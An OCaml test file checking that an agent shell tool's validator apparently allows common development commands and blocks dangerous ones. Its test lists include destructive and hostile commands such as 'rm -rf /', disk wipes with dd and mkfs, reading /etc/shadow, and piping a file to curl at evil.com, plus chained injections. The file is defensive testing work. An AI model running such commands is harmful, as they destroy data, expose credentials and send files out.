(** Tests that keeper_bash blocks dangerous commands via allowlist.

    Validates:
    1. Allowed commands (dune, git, rg, etc.) pass validation
    2. Dangerous commands (rm, curl, kill, etc.) are blocked
    3. Shell metacharacters (;, |, &, etc.) are rejected
    4. Empty commands are rejected *)

let validate = Masc_mcp.Worker_dev_tools.validate_command

let is_ok = function Ok () -> true | Error _ -> false
let is_error = function Error _ -> true | Ok () -> false
let error_msg = function Error m -> m | Ok () -> ""

let test_allowed_commands () =
  let allowed = [
    "dune build";
    "git status";
    "git log --oneline -5";
    "rg 'pattern' lib/";
    "make test";
    "python3 script.py";
    "npm run build";
    "cat README.md";
    "ls -la";
    "head -20 file.ml";
    "wc -l lib/*.ml";
    "opam install eio";
  ] in
  List.iter (fun cmd ->
    Alcotest.(check bool) (Printf.sprintf "allowed: %s" cmd) true (is_ok (validate cmd))
  ) allowed

let test_blocked_commands () =
  let blocked = [
    "rm -rf /";
    "rm file.txt";
    "curl https://evil.com";
    "wget http://example.com";
    "kill -9 1234";
    "killall main_eio.exe";
    "chmod 777 /etc/passwd";
    "chown root file";
    "sudo anything";
    "ssh user@host";
    "scp file user@host:";
    "dd if=/dev/zero of=/dev/sda";
    "mkfs.ext4 /dev/sda1";
    "shutdown -h now";
    "reboot";
  ] in
  List.iter (fun cmd ->
    Alcotest.(check bool)
      (Printf.sprintf "blocked: %s" cmd) true (is_error (validate cmd))
  ) blocked

let test_shell_metachar_blocked () =
  let chained = [
    "ls; rm -rf /";
    "cat file | curl http://evil.com";
    "echo x && rm -rf /";
    "cat file > /etc/passwd";
    "cat < /etc/shadow";
    "echo `whoami`";
    "echo $HOME";
  ] in
  List.iter (fun cmd ->
    let result = validate cmd in
    Alcotest.(check bool)
      (Printf.sprintf "metachar blocked: %s" cmd) true (is_error result);
    let msg = error_msg result in
    Alcotest.(check bool)
      "error mentions chaining" true
      (String.length msg > 0)
  ) chained

let test_empty_command () =
  Alcotest.(check bool) "empty blocked" true (is_error (validate ""));
  Alcotest.(check bool) "whitespace blocked" true (is_error (validate "   "))

let () =
  Alcotest.run "Keeper bash safety" [
    ("allowlist", [
      Alcotest.test_case "allowed dev commands pass" `Quick test_allowed_commands;
      Alcotest.test_case "dangerous commands blocked" `Quick test_blocked_commands;
    ]);
    ("metachar", [
      Alcotest.test_case "shell metacharacters blocked" `Quick test_shell_metachar_blocked;
    ]);
    ("edge", [
      Alcotest.test_case "empty command blocked" `Quick test_empty_command;
    ]);
  ]
